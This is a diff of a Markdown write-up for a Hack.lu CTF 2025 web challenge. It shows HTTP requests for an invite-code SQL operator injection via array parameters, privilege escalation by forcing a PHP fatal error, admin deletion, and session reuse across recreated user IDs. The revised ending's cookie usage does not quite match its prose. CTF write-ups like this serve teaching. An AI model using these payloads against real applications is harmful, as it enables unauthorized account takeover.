@@ -8,24 +8,15 @@ tags: [ctf,php,auth,session]
 toc: false
 ---
 
-
 **CTF:** Hack.lu CTF 2025
-
 **Challenge created by**: `pspaul`
-
 **Category:** Web
-
 **Points:** 121
-
 **Goal:** Shop all the hacker things!
 
-## Introduction
+## First Look
 
-This CTF challenge requires us to gain access to a flag located at `/flag.php`. A preliminary review of the web application and its source code reveals that this page is only accessible to users with specific read permissions. The challenge involves bypassing several security measures, including the registration invitation code, manipulating user accounts, and escalating privileges to finally read the flag.
-
-## Code Analysis and Goal Scoping
-
-Our primary goal is to read the contents of `/flag.php`. The code for this page is straightforward:
+After a first look at the source code of the challenge, it is clear that it is going to be a authentication/authorization bypass lab. The main evidence is that the endpoint containing the flag has authorization checks:
 
 ```php
 <?php
@@ -49,31 +40,83 @@ if (has_perms('flag_read')) {
 include_once 'inc/footer.php';
 ```
 
-From this, it's clear we need to be authenticated and have the `flag_read` permission. The administrator account, created during the installation process in `install.php`, is granted this permission. This implies our path to the flag involves gaining administrative privileges.
+Looking at the web in production enviroment, the next obstacle becomes apparent - we do not even have an account to log in with. Instead, the registration is possible only if we own a special invite code.
 
-The registration process, handled by `register.php`, requires an invitation code. This is our first obstacle. Subsequently, we will need to find a way to escalate our privileges to match those of an administrator.
+## Invite Code Bypass
 
-## The Path to the Flag: A Step-by-Step Walkthrough
+It can be observed that in the database handling code is an apparent SQL injection vulnerability:
 
-### 1. Bypassing the Invitation Code
+```php
+private function buildWhere($where, $op = 'AND') {
+    // previous iterations handled username and password
+    // iteration for "code":
+    // $name is 'code'
+    // $value is ['!=', '']
+    
+    // ...
+    } else {
+        // quoteName('code') returns `code`
+        // calling buildTerm(['!=', ''])
+        $sql .= ' ' . $this->quoteName($name) . $this->buildTerm($value);
+    }
+    // ...
+}
 
-The registration form requires a valid invitation code. However, the validation logic is flawed and can be bypassed with a crafted request.
+private function buildTerm($term) {
+    // $term is ['!=', '']
 
-**Technical Explanation:**
+    if (is_array($term)) { // true
+        
+        // count($term) == 2
+        // isset($term[0]) == true
+        // isOperator('!=') == true (see isOperator())
+        if (count($term) == 2 && isset($term[0]) && $this->isOperator($term[0])) {
+            $comparison = $term[0]; // becomes '!='
+            $criterion_value = $term[1]; // becomes ''
+            
+        } else {
+            return 'IN ' . $this->buildValue($term);
+        }
+    } else {
+        // skipped
+    }
 
-The bypass involves overcoming two distinct checks in `register.php`. First, the script checks if the `code` parameter is a string: `is_string($_REQUEST['code'])`. Second, it validates the code using `is_valid_invite($_POST['code'])`.
+    // buildValue('') returns the string '' 
+    // result string: " != ''"
+    return " $comparison " . $this->buildValue($criterion_value); 
+}
 
-Our payload cleverly separates the data used for each check. We send `code` both in the POST body as an array (`code[]=!=&code[]=`) and as a cookie (`Cookie: code`).
+private function isOperator($operator) {
+    // $operator is '!='
+    return in_array($operator, [
+        '=', '!=', '<', '<=', '>', '>=', '<>',
+        'LIKE', 'NOT LIKE', 'IN', 'NOT IN',
+    ], true); // returns true
+}
+```
 
-1.  **Passing the `is_string` check:** 
+If we pass the `code` as a list, we can create following SQL query:
 
-    Because a cookie is present, `$_REQUEST['code']` (which combines `$_POST`, `$_GET`, and `$_COOKIE`) is treated as a string, satisfying the `is_string` condition.
+```sql
+SELECT * FROM invites WHERE `code` != '';
+```
 
-2.  **Bypassing the validation:**
+That will always evaluate to `true`, as \`code\` is never equal to empty string.
 
-    The subsequent call to `is_valid_invite` specifically uses `$_POST['code']`, which is our array `['!=', '']`. In `inc/db.php`, the `buildTerm` function sees this array and constructs a SQL `WHERE` clause like `code != ''`. Since the `invites` table is not empty, this query returns a result, making the function return `true` and bypassing the invitation code check.
+The goal now is how can the `code` parameter be a list and not a string?
 
-Here is the request to register the user "mike":
+From the code handling the invitation is clear, that the logic is flawed and can be bypassed. The invitation code is sent to the server by POST request, where the `code` is originally in the data part of the POST request. 
+
+```http
+POST /register.php HTTP/1.1
+Host: fdf8127bd15a8b51.xn--hkk-qla.shop
+Content-Length: 45
+Content-Type: application/x-www-form-urlencoded
+
+username=mike&password=pass&code=somecode
+```
+
+However in the code, the `code` parameter is at first being checked by condition `is_string($_REQUEST['code'])` and later by `is_valid_invite($_POST['code'])`. In PHP the variables from `$_REQUEST` come from the GET -> POST -> COOKIE inputs in this order by default. But `$_POST` takes only the POST data. This knowledge is very handy. We can send a cookie `code` as an empty string and that will make the `is_string($_REQUEST['code'])` condition evaluate to true. And in the POST data parameters, we can send the list that will lead to the SQL injection evaluating the `is_valid_invite($_POST['code'])` to true.
 
 ```http
 POST /register.php HTTP/1.1
@@ -85,32 +128,17 @@ Content-Type: application/x-www-form-urlencoded
 username=mike&password=pass&code[]=!=&code[]=
 ```
 
-### 2. Logging In
+## Log in
 
-After successfully registering, we log in to obtain a valid session cookie.
+Now we can log in with our registered account. An interesting fact can be observed. If no session cookie is provided during the login request, a new one is issued. However, when the user provides the `PHPSESSID` in the login request, that exact cookie becomes valid logged in cookie. 
 
-```http
-POST /login.php HTTP/1.1
-Content-Length: 27
-Origin: https://d2d7ccd10da6c316.xn--hkk-qla.shop
-Content-Type: application/x-www-form-urlencoded
+## Delete Account Functionality
 
-username=mike&password=pass
-```
+There is not much that we are able to do as logged in user. We can only delete our own account. 
 
-Upon a successful login, the server sets a `PHPSESSID` cookie that is tied to our user account. It is important to note that if no session cookie is provided during the login request, a new one is issued. This will be crucial later.
+Observing the source code handling the deletion of an account, we see that the function before deletion grants the user session temporary `users_delete` and `perms_delete` permissions. After delete, the permissions are deleted.
 
-### 3. Deleting the Admin Account
-
-The settings page allows users to delete their own accounts. However, this functionality has a vulnerability that allows for privilege escalation.
-
-**Technical Explanation:**
-
-In `settings.php`, when a user deletes their own account, the application temporarily grants `users_delete` and `perms_delete` permissions to the session via `add_tmp_perms`. The script then attempts to display a success message using `show_success($_REQUEST['msg'])` before removing the temporary permissions and logging the user out.
-
-We can exploit this by passing `msg` as an array in the URL (`msg[]=x`). The `show_success` function expects a string argument, but we are providing an array. This type mismatch causes a fatal error in the PHP script. The error halts execution immediately. As a result, the code that follows—`rm_tmp_perms(...)` and `header('Location: logout.php')`—is never executed. Our session is not destroyed, and it retains the elevated temporary permissions to delete other users.
-
-First, we delete our own account (`uid = 2`) to trigger the error and gain the temporary permissions:
+We can however terminate the function right after granting our session the permissions. That would leave the permissions for our session permanent. The termination can be done by passing parameter `msg` as an array and not a string. That will cause en error in that part of code before invalidating the delete permissions.
 
 ```http
 POST /settings.php?uid=2&msg[]=x HTTP/1.1
@@ -121,9 +149,17 @@ Content-Length: 14
 delete-user=1
 ```
 
-Now, with our session possessing delete permissions, we can delete the admin account (which has `uid = 1`):
+So now, we can delete other users and we know that our user ID is 2. ID number 1 is probably the admin user.
 
-```http
+## Install Script
+
+Deletion of other users is nice, but we need to find a path how to obtain the admin permissions. `install.php` script plays a crucial role. The script creates an admin account if there is none. In addition, the script will trigger if we access the resource `/install.php`.
+
+## Admin Deletion
+
+So lets delete admin.
+
+```
 POST /settings.php?uid=1 HTTP/1.1
 Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
 Content-Type: application/x-www-form-urlencoded
@@ -132,23 +168,9 @@ Content-Length: 14
 delete-user=1
 ```
 
-### 4. Creating a New User on UID 1
+## New User ID 1
 
-With the original admin account deleted, the `uid = 1` is now available. When we register a new user, the database will assign the lowest available primary key, which is now 1. We'll register a new user named "fill".
-
-```http
-POST /register.php HTTP/1.1
-Host: fdf8127bd15a8b51.xn--hkk-qla.shop
-Cookie: code
-Content-Length: 45
-Content-Type: application/x-www-form-urlencoded
-
-username=fill&password=pass&code[]=!=&code[]=
-```
-
-### 5. Creating a Valid Session for the New User on UID 1
-
-Next, we need to create a valid session for our new user "fill", which now has `uid = 1`. We do this by logging in, making sure to *not* include any existing session cookie. This forces the server to issue a new, valid session for `uid = 1`.
+Now when we register a new user, his ID will be the lowest available = 1. We will also obtain a valid session for user ID 1. That could be useful if the session handling is flawed.
 
 ```http
 POST /login.php HTTP/1.1
@@ -159,42 +181,22 @@ Content-Type: application/x-www-form-urlencoded
 username=fill&password=pass
 ```
 
-The response to this request will include a new `PHPSESSID` cookie. Let's call this session **eugene**. We'll save this session cookie for later.
+We can delete that account of ID 1 and save the session for later.  
 
-### 6. Deleting the "fill" User on UID 1
+## Admin Recreation
 
-We can now reuse our session from step 3, which still has the temporary delete permissions, to delete the "fill" user at `uid = 1`.
-
-```http
-POST /settings.php?uid=1 HTTP/1.1
-Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 14
-
-delete-user=1
-```
-
-### 7. Recreating the Admin Account
-
-By accessing `install.php`, we can trigger the installation script to run again. The script is designed to create an admin account if one does not already exist. Since we have deleted all users with `uid = 1`, the script will create a new admin account with `uid = 1`. We can use our session with delete rights for this step.
+Let's use the `install.php` script and test, if the session handling is flawed, more specifically, can we log in as just created administrator using the session we created for now deleted account which ID was also 1?
 
 ```http
 GET /install.php HTTP/1.1
 Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
 ```
 
-### 8. Logging in as Admin and Capturing the Flag
+```http
+GET /flag.php HTTP/1.1
+Cookie: PHPSESSID=396f3535c2e9346a182df142fb49a46d
+```
 
-Now, we can use the **eugene** session we saved in step 5. This session is associated with `uid = 1`. Since the admin account now occupies `uid = 1`, the **eugene** session will grant us access to the admin account. With administrative privileges, we can navigate to `/flag.php` to retrieve the flag.
+And the flag is there! The session we saved was granted with the admin permissions (`flag_read`) and we can read the `/flag.php`.
 
-## Conclusion: The Critical Flaws
-
-The successful exploit of this application hinged on two key vulnerabilities:
-
-1.  **Improper Error Handling leading to Privilege Escalation (Step 3):**
-  
-    The vulnerability in `settings.php` where temporary permissions are granted but not revoked is a critical flaw. By intentionally triggering a fatal error after gaining temporary permissions, an attacker can prevent the cleanup logic from running. This allows the attacker's session to retain elevated privileges indefinitely.
-
-3.  **Session Fixation (Steps 4 and 8):**
-
-    The application's session management is flawed. A session is tied to a user ID (`uid`) and is not invalidated when the user associated with that `uid` is deleted and replaced. This allows for a session fixation attack. We were able to create a user at a known `uid` (`uid = 1`), generate a valid session for that `uid`, and then replace the user at that `uid` with a privileged user (the admin). The previously generated session remained valid and was now associated with the new, privileged account, granting us unauthorized access.
+The server session handling is really wrong. When an user is deleted, it never invalidates the session connected to the user ID. That allowed us to create a session for a specific user ID of user A and then use that same session for user B holding the same user ID. 
